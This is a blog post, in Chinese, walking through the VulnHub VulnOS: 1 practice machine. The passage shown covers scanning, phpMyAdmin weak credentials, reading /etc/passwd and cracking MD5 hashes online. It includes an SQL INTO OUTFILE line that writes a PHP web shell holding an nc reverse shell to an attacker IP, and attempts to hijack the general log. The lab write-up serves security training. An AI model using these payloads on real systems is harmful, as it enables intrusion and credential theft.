@@ -1,0 +1,810 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="该文章暂无概述">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnOS: 1">
+<meta property="og:url" content="https://z9m8r8.github.io/2024/05/28/VulnOS%201/index.html">
+<meta property="og:site_name" content="Ghost&#39;s Blog">
+<meta property="og:description" content="该文章暂无概述">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-05-28T04:14:37.000Z">
+<meta property="article:modified_time" content="2024-05-28T09:09:59.564Z">
+<meta property="article:author" content="Ghost">
+<meta property="article:tag" content="Vulnhub">
+<meta property="article:tag" content="信息收集">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="CGI">
+<meta property="article:tag" content="phpmyadmin">
+<meta property="article:tag" content="drupal6">
+<meta property="article:tag" content="Dirty COW">
+<meta property="article:tag" content="MySQL">
+<meta property="article:tag" content="webmin">
+<meta property="article:tag" content="distccd">
+<meta property="article:tag" content="htpasswd">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://z9m8r8.github.io/2024/05/28/VulnOS%201/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2024/05/28/VulnOS%201/","path":"2024/05/28/VulnOS 1/","title":"VulnOS: 1"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>VulnOS: 1 | Ghost's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Ghost's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1. 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">1.1. 主机探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">1.2. 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.3. Web 信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="nav-text">2. 渗透攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-shell"><span class="nav-text">2.1. 获取 shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">2.2. 提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9E%E9%A1%BE"><span class="nav-text">3. 回顾</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#webmin-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-text">3.1. webmin 任意文件读取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#distccd-%E6%9C%8D%E5%8A%A1"><span class="nav-text">3.2. distccd 服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83-1"><span class="nav-text">3.3. 提权-1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83-2"><span class="nav-text">3.4. 提权-2</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ghost"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Ghost</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">152</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">102</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2024/05/28/VulnOS%201/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Ghost">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ghost's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="VulnOS: 1 | Ghost's Blog">
+      <meta itemprop="description" content="该文章暂无概述">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          VulnOS: 1
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-05-28 12:14:37 / 修改时间：17:09:59" itemprop="dateCreated datePublished" datetime="2024-05-28T12:14:37+08:00">2024-05-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>4.2k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>15 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">该文章暂无概述</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>靶机：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/vulnos-1,60/">VulnOS: 1
+~ VulnHub</a></p>
+</blockquote>
+<h2 id="信息收集">1. 信息收集</h2>
+<h3 id="主机探测">1.1. 主机探测</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth1 -r 10.0.3.0/24</span><br></pre></td></tr></table></figure>
+<p>靶机：10.0.3.21</p>
+<h3 id="端口扫描">1.2. 端口扫描</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sS 10.0.3.21 -p1-65535</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-27 02:09 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.0.3.21</span><br><span class="line">Host is up (0.00052s latency).</span><br><span class="line">Not shown: 65507 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">22/tcp    open  ssh         OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">23/tcp    open  telnet      Linux telnetd</span><br><span class="line">25/tcp    open  smtp        Postfix smtpd</span><br><span class="line">53/tcp    open  domain      ISC BIND 9.7.0-P1</span><br><span class="line">80/tcp    open  http        Apache httpd 2.2.14 ((Ubuntu))</span><br><span class="line">110/tcp   open  pop3        Dovecot pop3d</span><br><span class="line">111/tcp   open  rpcbind     2 (RPC <span class="comment">#100000)</span></span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">143/tcp   open  imap        Dovecot imapd</span><br><span class="line">389/tcp   open  ldap        OpenLDAP 2.2.X - 2.3.X</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">512/tcp   open  <span class="built_in">exec</span>        netkit-rsh rexecd</span><br><span class="line">513/tcp   open  login</span><br><span class="line">514/tcp   open  tcpwrapped</span><br><span class="line">901/tcp   open  http        Samba SWAT administration server</span><br><span class="line">993/tcp   open  ssl/imap    Dovecot imapd</span><br><span class="line">995/tcp   open  ssl/pop3    Dovecot pop3d</span><br><span class="line">2000/tcp  open  sieve       Dovecot timsieved</span><br><span class="line">2049/tcp  open  nfs         2-4 (RPC <span class="comment">#100003)</span></span><br><span class="line">3306/tcp  open  mysql       MySQL 5.1.73-0ubuntu0.10.04.1</span><br><span class="line">3632/tcp  open  tcpwrapped</span><br><span class="line">6667/tcp  open  irc         IRCnet ircd</span><br><span class="line">8070/tcp  open  ucs-isc?</span><br><span class="line">8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">10000/tcp open  http        MiniServ 0.01 (Webmin httpd)</span><br><span class="line">40239/tcp open  nlockmgr    1-4 (RPC <span class="comment">#100021)</span></span><br><span class="line">52988/tcp open  status      1 (RPC <span class="comment">#100024)</span></span><br><span class="line">54876/tcp open  mountd      1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: Hosts:  VulnOS.home, irc.localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 97.66 seconds</span><br></pre></td></tr></table></figure>
+<h3 id="web-信息收集">1.3. Web 信息收集</h3>
+<p>80 扫目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://10.0.3.21/&quot;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt,html  -f</span><br><span class="line"></span><br><span class="line">Target: http://10.0.3.21/</span><br><span class="line"></span><br><span class="line">[02:20:26] Starting: </span><br><span class="line">[02:20:26] 403 -  238B  - /cgi-bin/                                         </span><br><span class="line">[02:20:27] 200 -    7KB - /icons/                                           </span><br><span class="line">[02:20:30] 200 -  446B  - /index2                                           </span><br><span class="line">[02:20:30] 200 -  446B  - /index2.html                                      </span><br><span class="line">[02:20:32] 200 -    8KB - /doc/                                             </span><br><span class="line">[02:20:37] 200 -  444B  - /imgs/                                            </span><br><span class="line">[02:20:37] 301 -  242B  - /imgs  -&gt;  http://10.0.3.21/imgs/                 </span><br><span class="line">[02:20:46] 301 -  247B  - /javascript  -&gt;  http://10.0.3.21/javascript/     </span><br><span class="line">[02:20:46] 403 -  240B  - /javascript/</span><br><span class="line">[02:23:41] 301 -  246B  - /mediawiki  -&gt;  http://10.0.3.21/mediawiki/        </span><br><span class="line">[02:23:42] 301 -   20B  - /mediawiki/  -&gt;  http://10.0.3.21/mediawiki/index.php/Hoofdpagina</span><br><span class="line">[02:24:17] 301 -  246B  - /phpmyadmin  -&gt;  http://10.0.3.21/phpmyadmin/      </span><br><span class="line">[02:24:17] 200 -    3KB - /phpmyadmin/                                       </span><br><span class="line">[02:26:47] 301 -  245B  - /insecure  -&gt;  http://10.0.3.21/insecure/          </span><br><span class="line">[02:26:48] 200 -  529B  - /insecure/                                         </span><br><span class="line">[03:04:53] 301 -  247B  - /phpsysinfo  -&gt;  http://10.0.3.21/phpsysinfo/       </span><br><span class="line">[03:04:53] 200 -  752B  - /phpsysinfo/                                        </span><br><span class="line">[03:04:53] 301 -  247B  - /egroupware  -&gt;  http://10.0.3.21/egroupware/       </span><br><span class="line">[03:04:54] 302 -   20B  - /egroupware/  -&gt;  /egroupware/login.php?phpgw_forward=%2Findex.php</span><br><span class="line">[03:05:12] 301 -  248B  - /phpgroupware  -&gt;  http://10.0.3.21/phpgroupware/   </span><br><span class="line">[03:05:12] 302 -   20B  - /phpgroupware/  -&gt;  login.php                       </span><br><span class="line">[03:10:29] 403 -  238B  - /server-status                                      </span><br><span class="line">[03:10:29] 403 -  239B  - /server-status/                                     </span><br><span class="line">[03:57:00] 301 -  247B  - /phppgadmin  -&gt;  http://10.0.3.21/phppgadmin/       </span><br><span class="line">[03:57:00] 200 -  556B  - /phppgadmin/      </span><br></pre></td></tr></table></figure>
+<p>经测 <code>phpmyadmin</code> 存在弱口令 root/toor ，尝试写 shell</p>
+<blockquote>
+<p><a
+target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/269872.html">phpmyadmin如何获取shell
+- FreeBuf网络安全行业门户</a><br />
+<a target="_blank" rel="noopener" href="https://maidang.cool/2021/61419.html">phpMyAdmin之getshell |
+麦当的博客</a><br />
+<a target="_blank" rel="noopener" href="https://juejin.cn/post/7067803971968040996">渗透测试No.20
+phpmyadmin拿shell,date命令提权 - 掘金</a></p>
+</blockquote>
+<p>查变量 <code>secure_file_priv</code> 的值和当前用户输出文件权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">&#x27;%secure%&#x27;</span></span><br><span class="line"><span class="keyword">select</span> group_concat(user,0x3a,file_priv) from mysql.user</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202405272153576.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202405272157722.png" /></p>
+<p>看结果应该是可行的，但不知道绝对路径，盲猜了几个都没成功，示例</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&quot;&lt;?php system(&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.3.5 4444 &gt;/tmp/f&#x27;);?&gt;&quot;</span> into outfile <span class="string">&quot;/var/www/html/reshell.php&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202405272200659.png" /></p>
+<p>想通过写日志来实现，但日志文件试了几个位置都没成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">&#x27;%general%&#x27;</span>  <span class="comment"># 查 general_log 有没有开启及general_log_file文件</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> global general_log = 1;  <span class="comment"># 开启</span></span><br><span class="line"><span class="built_in">set</span> global general_log_file = <span class="string">&#x27;/var/www/html/rs.php&#x27;</span>;  <span class="comment"># 修改日志文件</span></span><br><span class="line"><span class="comment"># set global general_log_file = &#x27;/var/www/rs.php&#x27;;  # 修改日志文件</span></span><br><span class="line"><span class="comment"># set global general_log_file = &#x27;/wwwroot/www/rs.php&#x27;;  # 修改日志文件</span></span><br><span class="line">…………</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202405272211703.png" /></p>
+<p>不过可利用 <code>load_file()</code> 函数读取文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT CONVERT(load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>) USING utf8) AS passwd_content</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202405272214310.png" /></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash  </span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh  </span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh  </span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh  </span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync  </span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh  </span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh  </span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh  </span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh  </span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh  </span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh  </span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh  </span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh  </span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh  </span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh  </span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh  </span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh  </span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh  </span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh  </span><br><span class="line">syslog:x:101:103::/home/syslog:/bin/false  </span><br><span class="line">landscape:x:102:108::/var/lib/landscape:/bin/false  </span><br><span class="line">vulnosadmin:x:1000:1000:vulnosadmin,,,:/home/vulnosadmin:/bin/bash  </span><br><span class="line">sysadmin:x:1001:1001::/home/sysadmin:/bin/sh  </span><br><span class="line">webmin:x:1002:1002::/home/webmin:/bin/sh  </span><br><span class="line">hackme:x:1003:1003::/home/hackme:/bin/sh  </span><br><span class="line">sa:x:1004:1004::/home/sa:/bin/sh  </span><br><span class="line">stupiduser:x:1005:1005::/home/stupiduser:/bin/sh  </span><br><span class="line">messagebus:x:103:112::/var/run/dbus:/bin/false  </span><br><span class="line">distccd:x:104:65534::/:/bin/false  </span><br><span class="line">sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin  </span><br><span class="line">openldap:x:106:113:OpenLDAP Server Account,,,:/nonexistent:/bin/false  </span><br><span class="line">ftp:x:1006:1006::/home/ftp:/bin/sh  </span><br><span class="line">mysql:x:107:115:MySQL Server,,,:/var/lib/mysql:/bin/false  </span><br><span class="line">telnetd:x:108:116::/nonexistent:/bin/false  </span><br><span class="line"><span class="built_in">bind</span>:x:109:117::/var/cache/bind:/bin/false  </span><br><span class="line">postgres:x:110:118:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash  </span><br><span class="line">postfix:x:111:119::/var/spool/postfix:/bin/false  </span><br><span class="line">dovecot:x:112:121:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false  </span><br><span class="line">tomcat6:x:113:122::/usr/share/tomcat6:/bin/false  </span><br><span class="line">statd:x:114:65534::/var/lib/nfs:/bin/false  </span><br><span class="line">snmp:x:115:123::/var/lib/snmp:/bin/false  </span><br><span class="line">nagios:x:116:124::/var/lib/nagios:/bin/false  </span><br><span class="line">openerp:x:117:125:Open ERP server,,,:/home/openerp:/bin/false</span><br></pre></td></tr></table></figure>
+<p>没读到其他有价值的文件，不过 <code>phpmyadmin</code>
+可以看到有许多数据库</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202405272221596.png" /></p>
+<p>每个数据库也都能读到对应的用户信息</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202405272228140.png" /></p>
+<p>在线尝试破解【<a
+target="_blank" rel="noopener" href="https://www.somd5.com/">MD5免费在线解密破解-SOMD5</a> &amp; <a
+target="_blank" rel="noopener" href="https://www.cmd5.com/">md5在线解密破解,md5解密加密</a>】</p>
+<p>得</p>
+<table>
+<colgroup>
+<col style="width: 11%" />
+<col style="width: 25%" />
+<col style="width: 50%" />
+<col style="width: 13%" />
+</colgroup>
+<thead>
+<tr class="header">
